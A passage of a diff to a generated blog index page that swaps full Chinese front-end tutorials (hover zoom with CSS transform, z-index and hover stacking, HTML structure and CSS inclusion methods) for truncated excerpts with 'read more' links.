-<p>通过第二种方式传统定位实现的，hover图片放大，不是从中心点放大，而是以左上角为起始位置向右下角方向延伸放大，这不是我们想要的效果。</p>
-</blockquote>
-<p>######那么，以此为基础作出假设若要实现从中心点的放大是不是只要将被 hover 的元素，居中就行了呢？</p>
-<blockquote>
-<p>然而通过强制修改被 hover 元素的定位，在 hover 中将其设置居中，并不能实现想要的效果，元素依然从左上角向右下角延伸放大，只是在放大的过程的有一个位置的跳跃，跳跃到中间罢了，过渡非常生硬。</p>
-</blockquote>
-<p>#####那么，如何才能实现鼠标 hover 元素中心点 “平滑” 放大效果呢？</p>
-<blockquote>
-<p>传统的改变宽高的方式是行不通的，这时候需要用到 transform 属性，通过设置 transform: scale(1.2); 来实现中心放大的效果，当然其中的数值可以自己设置。</p>
-</blockquote>
-<hr>
-<p>下面我分别给两个图片设置定位，一个是左上角定位，一个是居中定位（实现效果如下图）<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">"text/css"</span>&gt;</span><span class="css"></span></div><div class="line">		<span class="selector-class">.div_1</span>&#123;</div><div class="line">			<span class="attribute">display</span>: inline-block;</div><div class="line">			<span class="attribute">width</span>: <span class="number">500px</span>;</div><div class="line">			<span class="attribute">height</span>: <span class="number">500px</span>;</div><div class="line">			<span class="attribute">border</span>: <span class="number">1px</span> solid blue;</div><div class="line">			<span class="attribute">position</span>: relative;</div><div class="line">		&#125;</div><div class="line">		<span class="selector-class">.img1</span>&#123;</div><div class="line">			<span class="attribute">width</span>: <span class="number">400px</span>;</div><div class="line">			<span class="attribute">height</span>: <span class="number">320px</span>;</div><div class="line">			<span class="attribute">position</span>: absolute;</div><div class="line">			<span class="attribute">left</span>: <span class="number">0</span>;</div><div class="line">			<span class="attribute">top</span>: <span class="number">0</span>;</div><div class="line">			<span class="attribute">transition</span>: all .<span class="number">4s</span>;</div><div class="line">			<span class="attribute">cursor</span>: pointer;</div><div class="line">		&#125;</div><div class="line">		<span class="selector-class">.img1</span><span class="selector-pseudo">:hover</span>&#123;</div><div class="line">			<span class="attribute">zoom</span>:<span class="number">1</span>;</div><div class="line">			<span class="attribute">transform</span>: <span class="built_in">scale</span>(1.2);</div><div class="line">		&#125;</div><div class="line">		<span class="selector-class">.div_2</span>&#123;</div><div class="line">			<span class="attribute">display</span>: inline-block;</div><div class="line">			<span class="attribute">width</span>: <span class="number">500px</span>;</div><div class="line">			<span class="attribute">height</span>: <span class="number">500px</span>;</div><div class="line">			<span class="attribute">border</span>: <span class="number">1px</span> solid yellow;</div><div class="line">			<span class="attribute">position</span>: relative;</div><div class="line">		&#125;</div><div class="line">		<span class="selector-class">.img2</span>&#123;</div><div class="line">			<span class="attribute">width</span>: <span class="number">400px</span>;</div><div class="line">			<span class="attribute">height</span>: <span class="number">320px</span>;</div><div class="line">			<span class="attribute">position</span>: absolute;</div><div class="line">			<span class="attribute">top</span>: <span class="number">0</span>;<span class="attribute">right</span>: <span class="number">0</span>;<span class="attribute">bottom</span>: <span class="number">0</span>;<span class="attribute">left</span>: <span class="number">0</span>;</div><div class="line">			<span class="attribute">margin</span>: auto;</div><div class="line">			<span class="attribute">transition</span>: all .<span class="number">4s</span>;</div><div class="line">			<span class="attribute">cursor</span>: pointer;</div><div class="line">		&#125;</div><div class="line">		<span class="selector-class">.img2</span><span class="selector-pseudo">:hover</span>&#123;</div><div class="line">			<span class="attribute">zoom</span>:<span class="number">1</span>;</div><div class="line">			<span class="attribute">transform</span>: <span class="built_in">scale</span>(1.2);</div><div class="line">		&#125;</div><div class="line">	<span class="tag">&lt;/<span class="name">style</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"div_1"</span>&gt;</span></div><div class="line">		<span class="tag">&lt;<span class="name">img</span> <span class="attr">class</span>=<span class="string">"img1"</span> <span class="attr">src</span>=<span class="string">"hy.jpg"</span> <span class="attr">alt</span>=<span class="string">""</span>&gt;</span></div><div class="line">	<span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"div_2"</span>&gt;</span></div><div class="line">		<span class="tag">&lt;<span class="name">img</span> <span class="attr">class</span>=<span class="string">"img2"</span> <span class="attr">src</span>=<span class="string">"hy.jpg"</span> <span class="attr">alt</span>=<span class="string">""</span>&gt;</span></div><div class="line">	<span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure></p>
-<p><img src="http://upload-images.jianshu.io/upload_images/2836722-c29dec2617dba1ae.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="原始状态"></p>
-<p><img src="http://upload-images.jianshu.io/upload_images/2836722-ae7b9afd94514e82.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="左上角中心放大"></p>
-<p><img src="http://upload-images.jianshu.io/upload_images/2836722-e918063dd77a4fcb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="居中中心放大"></p>
-<hr>
-<blockquote>
-<p>以上纯属个人学习总结，如有疏漏或者不足之处还望指正，谢谢！</p>
-</blockquote>
-
+<p>+
+          
       
     </div>
     
@@ -877,6 +624,10 @@
       
 
       
+      
+        <p class="article-more-link">
+          <a href="/2015/04/17/实现鼠标-hover-元素中心点放大效果/#more">阅读全文 >></a>
+        </p>
       
       <div class="clearfix"></div>
     </div>
@@ -923,40 +674,13 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <blockquote>
+              <blockquote>
 <p>之前在做网页的过程( 纯 HTML + CSS )中遇到过这么一个问题：当父级在使用了定位的情况下，如何实现父级能够覆盖通过hover显示的子级的部分区域？(情况如图所示)</p>
 </blockquote>
 <p><img src="http://upload-images.jianshu.io/upload_images/2836722-adea6340934f2d8f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Image.png"></p>
 <blockquote>
-<p>如图所示的情况，是需要通过父级的白色背景来覆盖子级的边框以实现图中的效果</p>
-</blockquote>
-<hr>
-<p>######遇到这种情况，相信大家的第一反应都一样，那就是给父级设置 z-index 使得父级的 z-index 大于子级的 z-index。<br>然而事实证明这样的方法是行不通的，因为父级和子级同时都设置了定位，那么在无论给父级设置怎样的 z-index 都不可能大于子级的 z-index，因为子级始终是基于父级之上的。</p>
-<p>######那么给子级设置负数 z-index 呢？<br>我不得不说在给子级设置一个比较大的负数之后的确有效果，这样做使得原本一直是子级覆盖父级的情况发生改变，但是并不能扭转局面，而是出现一种父级和子级貌似平级但是都无法相互覆盖，内容也不发生拥挤，边框可以叠压在父级内容之上，但是子级白色背景却无法覆盖父级的情况。事实证明这种方法也行不通。</p>
-<p>######那么给父级取消定位不就好了？<br>确实，这样的话问题就不存在了。但是，图中情况子级必须用到绝对定位，而使用绝对定位则必须给父级设置定位，那么在这种大前提下，是不可能的。</p>
-<hr>
-<p>###<strong>那如何才能解决这一疑难杂症呢？</strong></p>
-<p>#####我们首先来分析一下图中情况</p>
-<blockquote>
-<p>图中需要实现的是在划动父级的过程中出现子级，而由于特殊边框这一情况我们需要使得父级遮盖一部分子级边框方能达到图中所示效果。</p>
-</blockquote>
-<p>#####1.对于实现划动父级的过程中出现子级</p>
-<blockquote>
-<p>方法有二<br>1.通过父级 hover 子级的方式实现<br>2.通过兄弟关系 hover 实现（只能实现上一个兄弟元素 hover 下一个兄弟元素，无法实现后面的 hover 前面的兄弟元素）<br>既然第一种方法无法达到我们想要的结果，那么自然而然应该试试第二种方法</p>
-</blockquote>
-<p>#####2.兄弟关系 hover （只能实现上一个兄弟元素 hover 下一个兄弟元素，无法实现后面的 hover 前面的兄弟元素）</p>
-<blockquote>
-<p>通过兄弟关系 hover 确实能够达到想要的结果，因为没有了父子级的关系，那么兄弟之间的 z-index 相对独立，只要其中任意一个比另外一个要高，那么就能覆盖低的那一个。效果是达到了，但是通过 hover 出现的后一级兄弟元素无法通过鼠标选中和点击了，换句话说，一旦鼠标离开前一级兄弟元素的范围，通过 hover 出现的后一级兄弟就会消失。（梦想看得见了，却摸不着了。）</p>
-</blockquote>
-<p>####3.如何解决“摸不着”的问题呢？</p>
-<blockquote>
-<p>由于 hover 属性的特点，只要鼠标在被 hover 元素的范围内，那么通过 hover 出现的元素就不会消失，相反若是通过 hover 出现的元素在被 hover 元素的范围内，那么理所应当便可以被点击和选中了。解决方法只需在给这两个兄弟元素套一个父级，被 hover 的元素若是父级，那么子级自然就在 hover区域内，在hover区域内操作鼠标通过 hover 出现的子元素自然就不会消失了。</p>
-</blockquote>
-<hr>
-<blockquote>
-<p>以上纯属个人学习总结，如有疏漏或者不足之处还望指正，谢谢！</p>
-</blockquote>
-
+<p>如图所示的情况，是需要通过父级的白色背景来覆盖子级的边框以实现图中的效果<br>+
+          
       
     </div>
     
@@ -965,6 +689,10 @@
       
 
       
+      
+        <p class="article-more-link">
+          <a href="/2015/04/01/HTML-5-基础之-hover-疑难杂症/#more">阅读全文 >></a>
+        </p>
       
       <div class="clearfix"></div>
     </div>
@@ -1011,7 +739,7 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <h2 id="1-前端认知"><a href="#1-前端认知" class="headerlink" title="1.前端认知"></a>1.前端认知</h2><h3 id="前端开发到底是做什么的？"><a href="#前端开发到底是做什么的？" class="headerlink" title="前端开发到底是做什么的？"></a>前端开发到底是做什么的？</h3><ul>
+              <h2 id="1-前端认知"><a href="#1-前端认知" class="headerlink" title="1.前端认知"></a>1.前端认知</h2><h3 id="前端开发到底是做什么的？"><a href="#前端开发到底是做什么的？" class="headerlink" title="前端开发到底是做什么的？"></a>前端开发到底是做什么的？</h3><ul>
 <li><h4 id="我们是做什么的？"><a href="#我们是做什么的？" class="headerlink" title="我们是做什么的？"></a>我们是做什么的？</h4><blockquote>
 <h5 id="IT系统工程"><a href="#IT系统工程" class="headerlink" title="IT系统工程"></a>IT系统工程</h5><h5 id="负责信息化系统的设计、建设，包括设备、系统、数据库、应用系统的建设"><a href="#负责信息化系统的设计、建设，包括设备、系统、数据库、应用系统的建设" class="headerlink" title="负责信息化系统的设计、建设，包括设备、系统、数据库、应用系统的建设"></a>负责信息化系统的设计、建设，包括设备、系统、数据库、应用系统的建设</h5></blockquote>
 </li>
@@ -1034,37 +762,8 @@
 <h6 id="HTML-CSS-JavaScript-其他一些语言（Ajax-PHP-Node-js）"><a href="#HTML-CSS-JavaScript-其他一些语言（Ajax-PHP-Node-js）" class="headerlink" title="HTML    CSS    JavaScript      其他一些语言（Ajax    PHP    Node.js）"></a>HTML    CSS    JavaScript      其他一些语言（Ajax    PHP    Node.js）</h6></blockquote>
 </li>
 </ul>
-<h2 id="2-前端开发核心语言"><a href="#2-前端开发核心语言" class="headerlink" title="2.前端开发核心语言"></a>2.前端开发核心语言</h2><table>
-<thead>
-<tr>
-<th>结构</th>
-<th>样式</th>
-<th>行为</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>HTML</td>
-<td>CSS</td>
-<td>JavaScript</td>
-</tr>
-</tbody>
-</table>
-<h2 id="3-HTML"><a href="#3-HTML" class="headerlink" title="3. HTML"></a>3. HTML</h2><h3 id="HTML基本结构-html"><a href="#HTML基本结构-html" class="headerlink" title="HTML基本结构.html"></a><code>HTML基本结构.html</code></h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div></pre></td><td class="code"><pre><div class="line"><span class="comment">&lt;!-- 注释 --&gt;</span></div><div class="line"><span class="comment">&lt;!-- Ctrl + / --&gt;</span></div><div class="line"><span class="comment">&lt;!-- </span></div><div class="line">	注释主要是为了开发人员书写方便，让你在后期从新回顾代码的时候，可以快速回想起来当时是如何处理的 </div><div class="line"></div><div class="line">	总结就一句话：注释是给人看的</div><div class="line">--&gt;</div><div class="line"><span class="comment">&lt;!-- 保存：Ctrl + s  --&gt;</span></div><div class="line"><span class="comment">&lt;!-- 新建：Ctrl + n  --&gt;</span></div><div class="line"></div><div class="line"><span class="comment">&lt;!-- 文档头（类型）声明 --&gt;</span></div><div class="line"><span class="comment">&lt;!-- 代表的是 HTML 5 的标准 --&gt;</span></div><div class="line"><span class="comment">&lt;!-- 文档头声明 不是标签 （面试） --&gt;</span></div><div class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></div><div class="line"><span class="comment">&lt;!-- 定义 HTML 的根元素 --&gt;</span></div><div class="line"><span class="comment">&lt;!-- 所有的 HTML 代码全部是书写在根元素当中的 --&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line">	</div><div class="line">	<span class="comment">&lt;!-- 头部 --&gt;</span></div><div class="line">	<span class="comment">&lt;!-- </span></div><div class="line">		里面包含的绝大部分内容都是不可见的，里面的内容主要用于辅助页面的展示</div><div class="line">	 --&gt;</div><div class="line">	<span class="tag">&lt;<span class="name">head</span>&gt;</span></div><div class="line">		<span class="comment">&lt;!-- </span></div><div class="line">			title:双标签  用于定于页面标题</div><div class="line">		 --&gt;</div><div class="line">		<span class="tag">&lt;<span class="name">title</span>&gt;</span>Hello World！<span class="tag">&lt;/<span class="name">title</span>&gt;</span></div><div class="line"></div><div class="line">		<span class="comment">&lt;!-- </span></div><div class="line">			meta：单标签  用于定义页面的元数据</div><div class="line">			属性：charset 针对搜索引擎和解析格式的属性</div><div class="line">		 --&gt;</div><div class="line">		<span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></div><div class="line">	<span class="tag">&lt;/<span class="name">head</span>&gt;</span></div><div class="line"></div><div class="line">	<span class="comment">&lt;!-- </span></div><div class="line">		里面包含的绝大部分在页面中都是可见的，主要用于搭建 HTML 结构</div><div class="line">	 --&gt;</div><div class="line">	<span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line">		</div><div class="line">		<span class="comment">&lt;!-- 历史上最最最常用的标签 --&gt;</span></div><div class="line">		<span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line">		<span class="comment">&lt;!-- </span></div><div class="line">			div：双标签  无意义</div><div class="line">		 --&gt;</div><div class="line">	<span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div><div class="line"></div><div class="line"><span class="comment">&lt;!-- </span></div><div class="line">	div 是 body 的子元素</div><div class="line">	body 是 div 的父元素</div><div class="line"></div><div class="line">	div 和 body 就是父子关系</div><div class="line">	head 和 body 是兄弟关系</div><div class="line"></div><div class="line">	如果是父子关系，一定要使用 tab 去进行标记</div><div class="line"></div><div class="line">	可以使用 Ctrl + [   左移</div><div class="line">	         Ctrl + ]   右移</div><div class="line"> --&gt;</div></pre></td></tr></table></figure>
-<h3 id="CSS的引入方式-html"><a href="#CSS的引入方式-html" class="headerlink" title="CSS的引入方式.html"></a><code>CSS的引入方式.html</code></h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">head</span>&gt;</span></div><div class="line">		<span class="tag">&lt;<span class="name">title</span>&gt;</span>css的引入方式<span class="tag">&lt;/<span class="name">title</span>&gt;</span></div><div class="line">		<span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span> = <span class="string">"utf-8"</span>&gt;</span></div><div class="line"></div><div class="line">		<span class="comment">&lt;!-- </span></div><div class="line">			内部样式表 </div><div class="line"></div><div class="line">			优点：相对于内联样式表代码少、省略一些</div><div class="line">				  速度快，而且没有服务器的请求压力</div><div class="line"></div><div class="line">			缺点：不易改版和维护</div><div class="line">				  造成单个界面文件过大</div><div class="line">				  代码较乱，不易前后端交互</div><div class="line"></div><div class="line">			使用场景：一般用在大型网站的首页</div><div class="line">		--&gt;</div><div class="line">		<span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">"text/css"</span>&gt;</span><span class="css"></span></div><div class="line">			<span class="comment">/* </span></div><div class="line">			CSS 选择器存在优先级问题</div><div class="line"></div><div class="line">				内联样式表     1000</div><div class="line">				ID 选择器      100</div><div class="line">				类选择器       10</div><div class="line">				标签名选择器   1</div><div class="line"></div><div class="line">			*/</div><div class="line">			<span class="comment">/*1.标签名选择器*/</span></div><div class="line">			<span class="comment">/*作用范围：直接针对当前这个标签进行设置*/</span></div><div class="line">			<span class="selector-tag">div</span>&#123;</div><div class="line">				<span class="attribute">width</span>: <span class="number">100px</span>;</div><div class="line">				<span class="attribute">height</span>: <span class="number">100px</span>;</div><div class="line">				<span class="attribute">background-color</span>: red;</div><div class="line">			&#125;</div><div class="line"></div><div class="line">			<span class="comment">/*CSS的注释方式*/</span></div><div class="line"></div><div class="line">			<span class="comment">/*2.类选择器*/</span></div><div class="line">			<span class="comment">/* </span></div><div class="line">			使用注意：使用的时候，必须要在对应的标签内部有一个相同的 class 名称，这样才能一一对应</div><div class="line"></div><div class="line">			作用范围：具有对应的 class 名称的标签</div><div class="line"></div><div class="line">			特殊之处：在一个页面中，可以存在多次，因为它选择的是一类内容</div><div class="line">			*/</div><div class="line">			<span class="selector-class">.div_class</span>&#123;</div><div class="line">				<span class="attribute">width</span>: <span class="number">300px</span>;</div><div class="line">				<span class="attribute">height</span>: <span class="number">300px</span>;</div><div class="line">				<span class="attribute">background-color</span>: green;</div><div class="line">			&#125;</div><div class="line">			<span class="comment">/*3. ID 选择器*/</span></div><div class="line">			<span class="comment">/*</span></div><div class="line">			作用范围：具有对应的 id 名称的标签</div><div class="line"></div><div class="line">			特殊之处：在一个页面中，只能使用一次</div><div class="line">			*/</div><div class="line">			<span class="selector-id">#div_id</span>&#123;</div><div class="line">				<span class="attribute">width</span>: <span class="number">500px</span>;</div><div class="line">				<span class="attribute">height</span>: <span class="number">500px</span>;</div><div class="line">				<span class="attribute">background-color</span>: blue;</div><div class="line">			&#125;</div><div class="line">		<span class="tag">&lt;/<span class="name">style</span>&gt;</span></div><div class="line">	<span class="tag">&lt;/<span class="name">head</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line">		<span class="comment">&lt;!-- 第一种方式 --&gt;</span></div><div class="line">		<span class="comment">&lt;!-- </span></div><div class="line">			修改样式：width            用于设置宽度</div><div class="line">					  height           用于设置高度</div><div class="line">					  background-color 用于设置背景颜色</div><div class="line"></div><div class="line">			px 像素（长度单位）</div><div class="line"></div><div class="line">			属性名称 ：属性数值 ；</div><div class="line">		 --&gt;</div><div class="line">		<span class="comment">&lt;!-- &lt;div style="width: 100px;height: 100px;background-color: red;"&gt;&lt;/div&gt; --&gt;</span></div><div class="line">		<span class="comment">&lt;!-- </span></div><div class="line">			内联样式表（直接写在标签内部的这种方式，叫做内联样式表） </div><div class="line"></div><div class="line">			缺点：冗余代码多、维护起来非常困难</div><div class="line"></div><div class="line">			优点：优先级非常高</div><div class="line"></div><div class="line">			使用场景：确定了的，不会在修改的单个样式</div><div class="line">		--&gt;</div><div class="line">		<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"div_class"</span> <span class="attr">id</span>=<span class="string">"div_id"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line">	<span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure>
-<hr>
-<h3 id="外部样式表-html"><a href="#外部样式表-html" class="headerlink" title="外部样式表.html"></a><code>外部样式表.html</code></h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">type</span>=<span class="string">"text/css"</span> <span class="attr">href</span>=<span class="string">"CSS/style.css"</span>&gt;</span></div><div class="line">	<span class="comment">&lt;!-- </span></div><div class="line">		外部样式表</div><div class="line"></div><div class="line">		优点：利于维护和改版</div><div class="line">			  一个CSS文件控制多个页面</div><div class="line">			  减少代码量，代码简洁，利于分工</div><div class="line"></div><div class="line">		缺点：相对于单个界面，有垃圾数据</div><div class="line">			  会造成服务器的请求压力</div><div class="line"></div><div class="line">		使用场景：用于大型网站的二三级页面</div><div class="line">	 --&gt;</div><div class="line">    <span class="comment">&lt;!-- </span></div><div class="line">		link:</div><div class="line">				专门用于引入外部文件的标签</div><div class="line"></div><div class="line">				属性：</div><div class="line">					rel   当前引入文件和本身文件的关系</div><div class="line">					type  当前引入文件的类型、编码格式</div><div class="line">					href  用于书写引入外部样式所处位置</div><div class="line">	--&gt;</div><div class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure>
-<h4 id="style-css"><a href="#style-css" class="headerlink" title="style.css"></a><code>style.css</code></h4><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">div</span>&#123;</div><div class="line">	<span class="attribute">width</span>: <span class="number">500px</span>;</div><div class="line">	<span class="attribute">height</span>: <span class="number">500px</span>;</div><div class="line">	<span class="attribute">background-color</span>: yellow;</div><div class="line">	&#125;</div></pre></td></tr></table></figure>
-<hr>
-<h3 id="引入方式的优先级差别-html"><a href="#引入方式的优先级差别-html" class="headerlink" title="引入方式的优先级差别.html"></a><code>引入方式的优先级差别.html</code></h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">"text/css"</span>&gt;</span><span class="xml"></span></div><div class="line">		div&#123;</div><div class="line">			width: 300px;</div><div class="line">			height: 300px;</div><div class="line">			background-color: red;</div><div class="line">		&#125;</div><div class="line">	/*</div><div class="line">		引入方式的优先级：</div><div class="line">						内联&gt;内部和外部</div><div class="line">						内部和外部谁生效   如果选择器优先级相同 ，谁后引入谁生效</div><div class="line">										   如果选择器优先级不同，选择器优先级高的生效</div><div class="line">	*/</div><div class="line">	<span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">type</span>=<span class="string">"text/css"</span> <span class="attr">href</span>=<span class="string">"CSS/style.css"</span>&gt;</span></div><div class="line">	<span class="tag">&lt;/<span class="name">style</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"><span 